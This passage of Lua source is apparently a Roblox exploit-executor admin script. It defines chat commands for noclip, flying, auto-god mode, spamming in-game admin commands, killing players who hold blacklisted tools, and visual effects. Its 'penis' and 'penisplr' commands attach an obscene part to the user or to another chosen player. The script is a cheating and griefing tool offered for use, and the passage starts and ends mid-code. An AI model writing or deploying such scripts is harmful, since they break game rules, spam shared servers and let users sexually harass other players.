            if v and v.Character and v.Character:FindFirstChild("VampireVanquisher") then v.Character:FindFirstChild("VampireVanquisher"):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)game.Players:Chat("kill "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't crash the server, "..v.DisplayName..".")
                end
        end)
        spawn(function()
            if v.Backpack:FindFirstChild("VampireVanquisher") then v.Backpack:FindFirstChild("VampireVanquisher"):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't crash the server, "..v.DisplayName..".")
                end
        end)
    end
    end)until not Loops.antiservercrash
end)

addCommand("unantiservercrash",{},function()
    Loops.antiservercrash = false
end)

addCommand("blacklisttools",{"toolnames"},function(args)
	local fixer = args[1]
	for i=2, #args do
    	    fixer = fixer.." "..args[i]	
    	end
	local BlacklistedTools = fixer:split(";")
    Loops.blacklisttools = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    for i,v in pairs(game.Players:GetPlayers()) do
		for i,too in pairs(BlacklistedTools) do
        spawn(function()
            if v and v.Character and v.Character:FindFirstChild(too) then v.Character:FindFirstChild(too):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)game.Players:Chat("kill "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't use "..too..", "..v.DisplayName..".")
                end
        end)
        spawn(function()
            if v.Backpack:FindFirstChild(too) then v.Backpack:FindFirstChild(too):Destroy() game.Players:Chat("removetools "..v.Name)game.Players:Chat("reset "..v.Name)
                GUI:SendMessage(ScriptName, "Please don't use "..too..", "..v.DisplayName..".")
                end
        end)
		end
    end
    end)until not Loops.blacklisttools
end)

addCommand("unblacklisttools",{},function()
	Loops.blacklisttools = false
end)

addCommand("unantiservercrash",{},function()
    Loops.antiservercrash = false
end)

addCommand("antitool",{},function()
    Loops.antitool = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if chr:FindFirstChildOfClass("Tool") then
            chr:FindFirstChildOfClass("Tool"):Destroy()
            game.Players:Chat("removetools me")
        end
        if plr.Backpack:FindFirstChildOfClass("Tool") then
            plr.Backpack:ClearAllChildren()
            game.Players:Chat("removetools me")
        end
    end) until not Loops.antitool
end)

addCommand("unantitool",{},function()
    Loops.antitool = false
end)

addCommand("unantiabuse",{},function()
    Loops.antiabuse = false
end)

addCommand("antivoid",{},function()
    Loops.antivoid = true
    repeat game:GetService("RunService").RenderStepped:Wait()pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.HumanoidRootPart then
            if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < -7 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,5,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X,0,game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
            end
        end end)
    until not Loops.antivoid
end)

addCommand("unantivoid",{},function()
    Loops.antivoid = false
end)

addCommand("antiskydive",{},function()
    Loops.antiskydive = true
    repeat game:GetService("RunService").RenderStepped:Wait()pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.HumanoidRootPart then
            if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y > 256 then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,5,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z)
                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X,0,game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z)
            end
        end end)
    until not Loops.antiskydive
end)

addCommand("unantiskydive",{},function()
    Loops.antiskydive = false
end)

addCommand("antigrav",{},function()
    Loops.antigrav = true
    repeat game:GetService("RunService").RenderStepped:Wait()pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
            if game.Players.LocalPlayer.Character.Torso:FindFirstChildOfClass("BodyForce") then
			game.Players.LocalPlayer.Character.Torso:FindFirstChildOfClass("BodyForce"):Destroy()
		end
        end
end)
    until not Loops.antiskydive
end)

addCommand("unantigrav",{},function()
    Loops.antigrav = false
end)

addCommand("platform",{},function()
    Loops.platform = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Head then
            if not workspace.Terrain:FindFirstChild("PLATFORM###14") then
                local fakepart=Instance.new("Part",workspace.Terrain)fakepart.Name="PLATFORM###14"fakepart.Size=Vector3.new(10,1,10)fakepart.Anchored = true;fakepart.CanCollide = true;fakepart.Color = game.Players.LocalPlayer.Character.Torso.Color;if CustomColor then fakepart.Color=CustomColor end;fakepart.TopSurface="Smooth"fakepart.BottomSurface="Smooth"fakepart.Material = "SmoothPlastic"
            else
                local fakepart=workspace.Terrain:FindFirstChild("PLATFORM###14")
                fakepart.Color=game.Players.LocalPlayer.Character.Torso.Color
		if CustomColor then fakepart.Color=CustomColor end
                fakepart.CFrame=CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X,0.199999332,game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z) * CFrame.Angles(0,math.rad(game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation.Y),0) 
            end
        end
    end)
    until not Loops.platform
end)

addCommand("removeplatform",{},function()
    Loops.platform = false
	if workspace.Terrain:FindFirstChild("PLATFORM###14") then
    		workspace.Terrain:Destroy()
	end
end)

addCommand("unplatform",{},function()
    runCommand(prefix.."removeplatform",{})
end)

addCommand("antiname",{},function()
    Loops.antiname = true
    repeat wait() 
        if chr and chr:FindFirstChildOfClass("Model") and #chr:FindFirstChildOfClass("Model"):GetChildren()==2 then
            game.Players:Chat("unname me")
		chr:FindFirstChildOfClass("Model"):Destroy()
        end
    until not Loops.antiname
end)

addCommand("unantiname",{},function()
    Loops.antiname = false
end)

addCommand("noclip",{},function()
    Loops.noclip = true
    repeat game:GetService("RunService").Stepped:Wait()
        pcall(function()
			for _, child in pairs(chr:GetDescendants()) do
				if child:IsA("BasePart") and child.CanCollide == true then
					child.CanCollide = false
				end
			end
		end)
    until not Loops.noclip
end)

addCommand("clip",{},function()
    Loops.noclip=false
end)

addCommand("unnoclip",{},function()
    runCommand(prefix.."clip",{})
end)

addCommand("characteradded",{"player","command"},function(args)
	local s,f=pcall(function()
	for i,v in pairs(GetPlayers(args[1])) do
		local fixer = {}
		if #args>2 then
			for i=3,#args do
				table.insert(fixer,args[i])
			end
		end
		
		local function Charadd(Character)
			runCommand(prefix..args[2],fixer)
		end
		
		Connections["_CHARACTERADDED"..v.Name] = v.CharacterAdded:Connect(Charadd)
		Charadd(v.Character)
	end
	end)if not s then print(f) end
end)

addCommand("uncharacteradded",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		Connections["_CHARACTERADDED"..v.Name]:Disconnect()
	end
end)

addCommand("autogod",{},function()
    Loops.autogod = true
    repeat game:GetService("RunService").RenderStepped:Wait()
        pcall(function()
            if chr and chr:FindFirstChild("Humanoid") and tostring(chr.Humanoid.MaxHealth) ~= "inf" then
                game.Players:Chat("god me")
                game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
                game.Players.LocalPlayer.Character.Humanoid.Health = 9e9
            end
        end)
    until not Loops.autogod
end)

addCommand("unautogod",{},function()
    Loops.autogod = false
end)

addCommand("fly",{},function()
    repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local script = Instance.new("Script",game.Players.LocalPlayer.PlayerGui)
script.Name = "Fly##iiAdmin"
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local chr = plr.Character
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
chr.Humanoid.PlatformStand = true 
repeat wait() 
if not plr.PlayerGui:FindFirstChild("Fly##iiAdmin") then flying = false bg:Destroy() bv:Destroy() chr.Humanoid.PlatformStand = false error("Stop") end
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
chr.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end)

addCommand("unfly",{},function()
    game.Players.LocalPlayer.PlayerGui["Fly##iiAdmin"]:Destroy()
end)

addCommand("antitripmine",{},function()
    Loops.antitripmine = true
    repeat wait() 
        if workspace:FindFirstChild("SubspaceTripmine") then
            workspace:FindFirstChild("SubspaceTripmine"):Destroy()
            game.Players:Chat("clr")
        end
    until not Loops.antitripmine
end)

addCommand("unantitripmine",{},function()
    Loops.antitripmine = false
end)

addCommand("antieggbomb",{},function()
    Loops.antieggbomb = true
    repeat wait() 
        if workspace:FindFirstChild("EggBomb") then
            workspace:FindFirstChild("EggBomb"):Destroy()
            game.Players:Chat("clr")
        end
    until not Loops.antieggbomb
end)

addCommand("unantieggbomb",{},function()
    Loops.antieggbomb = false
end)

addCommand("spamcommands",{"delay","command"},function(args)
                Loops.spamcommand = true
                repeat
                    local message = args[2]
                for i=3, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        else
                        message = message.." "..args[i]
                        end
                end
                    for i,v in pairs(message:split("|")) do
                        game.Players:Chat(v)
                        wait(tonumber(args[1]))
                    end
until not Loops.spamcommand
end)

addCommand("bind",{"key","command"},function(args)
                Connections["_Binding"..tostring(math.random(0,99999))] =game:GetService("UserInputService").InputBegan:Connect(function(Key,GP)
                    if not GP and Key.KeyCode == Enum.KeyCode[args[1]] then
                    local message = args[2]
                for i=3, #args do
                        if args[i]=="<%RANDOMSTRING%>" then
                            local asuhdyuasd=""
                            for i=1,25 do
                            asuhdyuasd=asuhdyuasd..lettersTableFormat[math.random(#lettersTableFormat)]
                            end
                            
                            message = message.." "..asuhdyuasd
                        elseif args[i]==[[\n]] then
                        message = message.." ".."\n"
                        elseif args[i]=="<%MOUSETARGET%>" then
                            local MouseTarget = plr:GetMouse().Target
                            MouseTarget = MouseTarget.Parent
                            if MouseTarget:IsA("Accessory") or MouseTarget:IsA("Hat") then
                                MouseTarget = MouseTarget.Parent
                            end
                            if MouseTarget:FindFirstChild("Humanoid") and not string.find(MouseTarget.Name," ") then
                                message = message.." "..MouseTarget.Name
                            else
                                message = message.." ".."COULDNOTFINDPLAYER"
                            end
                        else
                        message = message.." "..args[i]
                        end
                end
                    for i,v in pairs(message:split("|")) do
                        game.Players:Chat(v)
                    end
                end
end)
end)

addCommand("unbind",{},function()
    for i,v in pairs(Connections) do if i:sub(1,8) == "_Binding" then v:Disconnect() end end
end)

addCommand("tptomouse",{},function()
    chr.HumanoidRootPart.CFrame = plr:GetMouse().Hit
end)

addCommand("tptohouse",{},function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.3467445, 8.22999954, 73.5216293)
end)

addCommand("tptoregen",{},function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Terrain["_Game"].Admin.Regen.CFrame * CFrame.new(0,2.5,0)
end)

addCommand("getusername",{"player (optional silentmode)"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        setclipboard(v.Name)
        if not args[2] then
            GUI:SendMessage(ScriptName, "The selected player's username has been copied to the clipboard.")
        end
    end
end)

addCommand("getdisplayname",{"player (optional silentmode)"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
        setclipboard(v.DisplayName)
        if not args[2] then
            GUI:SendMessage(ScriptName, "The selected player's display name has been copied to the clipboard.")
        end
    end
end)

addCommand("spamcommand",{"delay","command"},function(args)
    runCommand(prefix.."spamcommands",args)
end)

addCommand("unspamcommands",{},function()
    Loops.spamcommand = false
end)

addCommand("spam",{"delay","command"},function(args)
    runCommand(prefix.."spamcommands",args)
end)

addCommand("unspam",{},function()
    Loops.spamcommand = false
end)

addCommand("unspam",{},function()
    runCommand(prefix.."unspamcommands",{})
end)

addCommand("rainbowfog",{"range"},function(args)
    local Range = tonumber(args[1])
    local RainbowValue = 0
    
    Loops.rainbowfog=true
    repeat wait(0.05)
        RainbowValue = RainbowValue + 1/250
    if RainbowValue >= 1 then
        RainbowValue = 0
    end
        if game.Lighting.FogEnd ~= Range then
            game.Players:Chat("fogend "..tostring(Range))
        end
        game.Players:Chat("fogcolor "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).R*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).G*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).B*255)))
    until not Loops.rainbowfog
end)

addCommand("rainbowbaseplate",{},function()
    local RainbowValue = 0
    
    local Paint = GetPaint()
    Loops.rainbowbaseplate=true
    repeat wait()
        local s,f=pcall(function()
        RainbowValue = RainbowValue + 1/50
    if RainbowValue >= 1 then
        RainbowValue = 0
    end
        if not chr:FindFirstChild("PaintBucket") then Paint = GetPaint() end
        Paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            ["Part"] = game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate,
                            ["Color"] = Color3.fromHSV(RainbowValue,1,1)
                        })
                    end)until not Loops.rainbowbaseplate
end)

addCommand("unrainbowbaseplate",{},function()
    Loops.rainbowbaseplate = false
end)

addCommand("visualizer",{"r","g","b","customcolor","size","power","fadeamount (optional musicid)"},function(args)
    Loops.visualizer=true
    local RainbowIsOn = false
    local RainbowValue = 0
    if args[4] == "rainbow" then
        RainbowIsOn = true
    end
    local colorthingy = 0
    repeat wait(0.05)
        RainbowValue = RainbowValue + 1/250
        if RainbowValue >= 1 then
            RainbowValue = 0
        end
        if game.Lighting.FogStart ~= (800-tonumber(args[7])) then
            game.Players:Chat("fogstart "..(tostring(800-tonumber(args[7]))))
        end
        if RainbowIsOn then
            colorthingy = colorthingy + 1
            if colorthingy == 3 then
                colorthingy = 0
            game.Players:Chat("fogcolor "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).R*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).G*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).B*255)))
        end
        elseif args[4] == "random" then
            colorthingy = colorthingy + 1
            if colorthingy == 3 then
                colorthingy = 0
            game.Players:Chat("fogcolor "..tostring(math.random(0,255)).." "..tostring(math.random(0,255)).." "..tostring(math.random(0,255)))
            end
        else
            if args[1] ~= "nil" and args[2] ~= "nil" and args[3] ~= "nil" then
                if game.Lighting.FogColor ~= Color3.fromRGB(tonumber(args[1]),tonumber(args[2]),tonumber(args[3])) then
                    game.Players:Chat("fogcolor "..tostring(args[1]).." "..tostring(args[2]).." "..tostring(args[3]))
                end
            end
        end
	if args[8] then runCommand(prefix.."musiclock",{args[8]})
        end
        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
            game.Players:Chat("fogend "..tostring((game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness/tonumber(args[6])) + tonumber(args[5])))
        else
            game.Players:Chat("fogend "..200)
        end
    until not Loops.visualizer
end)

addCommand("unrainbowfog",{},function()
    Loops.rainbowfog=false
end)

addCommand("unvisualizer",{},function()
    Loops.visualizer=false
end)

addCommand("websocket",{"port"},function(args)
	CurrentWebsocket = WsPerExecutor.connect("ws://localhost:"..args[1])
	GUI:SendMessage(ScriptName, "Connected to web socket at port "..args[1])
end)

addCommand("penis",{"inches"},function(args)
if PersonsAdmin then
local inches = tonumber(args[1])
local part = nil

should = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
	if not part and v.Size==Vector3.new(1,1,inches) then
		part = v
		should:Disconnect()
	end
end)

game.Players:Chat("part/1/1/"..tostring(inches))

repeat wait() until part

GetPaint():WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{["Part"]=part,["Color"]=game.Players.LocalPlayer.Character.Head.Color})
part.CanCollide = false

Loops.penis = true
repeat game:GetService("RunService").RenderStepped:Wait()
part.CFrame = game.Players.LocalPlayer.Character.Torso.CFrame * CFrame.new(0,-1,inches*-0.5)
part.Velocity = Vector3.new(-30,0.5,0.5)
until not Loops.penis or not part
Loops.penis = false
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("unpenis",{},function()
Loops.penis = false
end)

addCommand("penisplr",{"player","inches"},function(args)
for i,vtarget in pairs(GetPlayers(args[1])) do
local inches = tonumber(args[2])
local part = nil

should = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
	if not part and v.Size==Vector3.new(1,1,inches) then
		part = v
		should:Disconnect()
	end
end)

game.Players:Chat("part/1/1/"..tostring(inches))

repeat wait() until part

GetPaint():WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{["Part"]=part,["Color"]=vtarget.Character.Head.Color})
part.CanCollide = false

Loops.penis = true
repeat game:GetService("RunService").RenderStepped:Wait()
part.CFrame = vtarget.Character.Torso.CFrame * CFrame.new(0,-1,inches*-0.5)
part.Velocity = Vector3.new(-30,0.5,0.5)
until not Loops.penis or not part
Loops.penis = false
end
end)

addCommand("unpenisplr",{},function()
Loops.penis = false
end)

addCommand("partvisualizer",{"amount","circlesize","power","w","h","t","angleamount","colordistort","colorupdatetime","turnspeed","custommode"},function(args)
if PersonsAdmin then
for i,v in pairs(args) do args[i] = tonumber(v) end
local Amnt = args[1]
local Size = args[2]
local Power = 50-args[3]
local TurnAmount = args[7]
local ColorDistortion = args[8]
local UpdTime = args[9]
local TurnSpeed = args[10]
local CustomMode = args[11]

local PartSize = Vector3.new(args[4],args[5],args[6])
local Parts = {}

local isLoadingParts = false
local function LoadParts()
	if not isLoadingParts then
		isLoadingParts = true
		Size = 0
		spawn(function()
			wait(1)
			isLoadingParts = false
			Size = args[2]
		end)
		for i=1,Amnt-#Parts do
			game.Players:Chat("part/"..tostring(PartSize.X).."/"..tostring(PartSize.Y).."/"..tostring(PartSize.Z))
		end
	end
end
local function NormalizedColor(R,G,B)
	if R>255 then R=255 end
	if R<0 then R=0 end
	if G>255 then G=255 end
	if G<0 then G=0 end
	if B>255 then B=255 end
	if B<0 then B=0 end
	return Color3.new(R/255,G/255,B/255)
end

local function GetVolume()
	if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
		if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").IsPlaying then
			return workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").PlaybackLoudness/Power
		else
			return 0
		end
	else
		return 0
	end
end

local function GetRawVolume()
	local Vol = 0
	
	if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound") then
		if workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").IsPlaying then
			Vol = workspace.Terrain["_Game"].Folder:FindFirstChild("Sound").PlaybackLoudness/ColorDistortion
		else
			Vol = 0
		end
	else
		Vol = 0
	end
	if Vol>255 then Vol=255 end
	return Vol
end

Connections.partvisualizera = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
	if not (#Parts > Amnt or #Parts == Amnt) then
		if v.Size == PartSize then
			table.insert(Parts,v)
		end
	end
end)

local Offset = 0
Connections.partvisualizerb = game:GetService("RunService").RenderStepped:Connect(function()
	local Volume = GetVolume()*1
	
	if #Parts == 0 then
		LoadParts()
	end

	for i,v in pairs(Parts) do
		if v.Parent ~= nil then
			local For = math.rad(i*(360/#Parts))+Offset
	    	v.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0,For,0) * CFrame.new(0,0,Size+Volume) * CFrame.Angles(math.rad(Volume*TurnAmount),0,0)
			v.Velocity = Vector3.new(-30,0.5,0.5)
			v.CanCollide = false
		else
			table.remove(Parts,i)
			spawn(function()
			wait(0.1)
			LoadParts()
			end)
		end
	end
	Offset = Offset + TurnSpeed
	
	if #Parts < Amnt then
		LoadParts()
	end
end)

local RainbowValue = 0
Loops.partvisualizer = true
repeat
pcall(function()
local Paint
pcall(function()
Paint = GetPaint()
end)
Paint.LocalScript.Disabled = true
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PaletteGui") then
game.Players.LocalPlayer.PlayerGui.PaletteGui:Destroy()
end
local ColorXD
RainbowValue = RainbowValue + 0.05
if RainbowValue >= 1 then
	RainbowValue = 0
end
if CustomMode==2 then
ColorXD = NormalizedColor(Color3.fromHSV(RainbowValue,1,1).R*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).G*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).B*255 + GetRawVolume())
elseif CustomMode==3 then
local numbert = math.ceil((os.clock()*4)%4)
local dacolorineed
if numbert == 0 or numbert == 1 then
dacolorineed = Color3.new(1,0,0)
end
if numbert == 2 then
dacolorineed = Color3.new(1,1,0)
end
if numbert == 3 then
dacolorineed = Color3.new(0,1,0)
end
if numbert == 4 then
dacolorineed = Color3.new(0,0,1)
end
ColorXD = NormalizedColor(dacolorineed.R*255 + GetRawVolume(),dacolorineed.G*255 + GetRawVolume(),dacolorineed.B*255 + GetRawVolume())
elseif CustomMode==4 then
ColorXD = NormalizedColor(args[12] + GetRawVolume(),args[13] + GetRawVolume(),args[14] + GetRawVolume())
else
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and CustomColor then
ColorXD = NormalizedColor(game.Players.LocalPlayer.Character.Torso.Color.R*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.G*255 + GetRawVolume(),game.Players.LocalPlayer.Character.Torso.Color.B*255 + GetRawVolume())
else
ColorXD = NormalizedColor(CustomColor.R*255 + GetRawVolume(),CustomColor.G*255 + GetRawVolume(),CustomColor.B*255 + GetRawVolume())
end
end

for i,v in pairs(Parts) do
	if v and v.Parent ~= nil then
		spawn(function()
			if CustomMode==1 then
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=NormalizedColor(math.random(0,255),math.random(0,255),math.random(0,255))})
			else
			Paint:WaitForChild("Remotes",1).ServerControls:InvokeServer("PaintPart",{["Part"]=v,["Color"]=ColorXD})
			end
		end)
	end
end
end) wait(UpdTime) until not Loops.partvisualizer

LoadParts()
else GUI:SendMessage(ScriptName, "This command does not work without Person's Admin.") end
end)

addCommand("partvisualizerwebsocket",{"amount","circlesize","power","w","h","t","angleamount","colordistort","colorupdatetime","turnspeed","updatetime","custommode"},function(args)
if PersonsAdmin then
local s,f=pcall(function()
for i,v in pairs(args) do args[i] = tonumber(v) end
local Amnt = args[1]
local Size = args[2]
local Power = 10-args[3]
local TurnAmount = args[7]
local ColorDistortion = args[8]
local UpdTime = args[9]
local TurnSpeed = args[10]
local CustomMode = args[12]

local PartSize = Vector3.new(args[4],args[5],args[6])
local Parts = {}

local isLoadingParts = false
local function LoadParts()
	if not isLoadingParts then
		isLoadingParts = true
		Size = 0
		spawn(function()
			wait(1)
			isLoadingParts = false
			Size = args[2]
		end)
		for i=1,Amnt-#Parts do
			game.Players:Chat("part/"..tostring(PartSize.X).."/"..tostring(PartSize.Y).."/"..tostring(PartSize.Z))
		end
	end
end
local function NormalizedColor(R,G,B)
	if R>255 then R=255 end
	if R<0 then R=0 end
	if G>255 then G=255 end
	if G<0 then G=0 end
	if B>255 then B=255 end
	if B<0 then B=0 end
	return Color3.new(R/255,G/255,B/255)
end

local lolVolume = 0
Connections.partvisualizerc = CurrentWebsocket.OnMessage:Connect(function(msg)
   lolVolume = tonumber(msg)
end)

Loops.partvisualizerb = true
if args[11] == -1 then
spawn(function()
repeat game:GetService("RunService").RenderStepped:Wait()
   CurrentWebsocket:Send("v")
until not Loops.partvisualizerb
end)
else
spawn(function()
repeat wait(args[11])
   CurrentWebsocket:Send("v")
until not Loops.partvisualizerb
end)
end

local function GetVolume()
	return lolVolume/Power
end

local function GetRawVolume()
	local Vol = lolVolume*ColorDistortion
	if Vol>255 then Vol=255 end
	print(Vol)
	return Vol
end

Connections.partvisualizera = workspace.Terrain["_Game"].Folder.ChildAdded:Connect(function(v)
	if not (#Parts > Amnt or #Parts == Amnt) then
		if v.Size == PartSize then
			table.insert(Parts,v)
		end
	end
end)

local Offset = 0
Connections.partvisualizerb = game:GetService("RunService").RenderStepped:Connect(function()
	local Volume = GetVolume()*1
	
	if #Parts == 0 then
		LoadParts()
	end

	for i,v in pairs(Parts) do
		if v.Parent ~= nil then
			local For = math.rad(i*(360/#Parts))+Offset
	    	v.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) * CFrame.Angles(0,For,0) * CFrame.new(0,0,Size+Volume) * CFrame.Angles(math.rad(Volume*TurnAmount),0,0)
			v.Velocity = Vector3.new(-30,0.5,0.5)
			v.CanCollide = false
		else
			table.remove(Parts,i)
			spawn(function()
			wait(0.1)
			LoadParts()
			end)
		end
	end
	Offset = Offset + TurnSpeed
	
	if #Parts < Amnt then
		LoadParts()
	end
end)

local RainbowValue = 0
Loops.partvisualizera = true
repeat
pcall(function()
local Paint
pcall(function()
Paint = GetPaint()
end)
Paint.LocalScript.Disabled = true
if game.Players.LocalPlayer.PlayerGui:FindFirstChild("PaletteGui") then
game.Players.LocalPlayer.PlayerGui.PaletteGui:Destroy()
end

local ColorXD
RainbowValue = RainbowValue + 0.05
if RainbowValue >= 1 then
	RainbowValue = 0
end
if CustomMode==2 then
ColorXD = NormalizedColor(Color3.fromHSV(RainbowValue,1,1).R*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).G*255 + GetRawVolume(),Color3.fromHSV(RainbowValue,1,1).B*255 + GetRawVolume())
elseif CustomMode==3 then
local numbert = math.ceil((os.clock()*4)%4)
local dacolorineed
if numbert == 0 or numbert == 1 then
dacolorineed = Color3.new(1,0,0)
end
if numbert == 2 then
dacolorineed = Color3.new(1,1,0)
end
if numbert == 3 then
dacolorineed = Color3.new(0,1,0)
end
if numbert == 4 then
dacolorineed = Color3.new(0,0,1)
end
ColorXD = NormalizedColor(dacolorineed.R*255 + GetRawVolume(),dacolorineed.G*255 + GetRawVolume(),dacolorineed.B*255 + GetRawVolume())
elseif CustomMode==4 then
ColorXD = NormalizedColor(args[12] + GetRawVolume(),args[13] + GetRawVolume(),args[14] + GetRawVolume())
else
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Torso") and CustomColor then
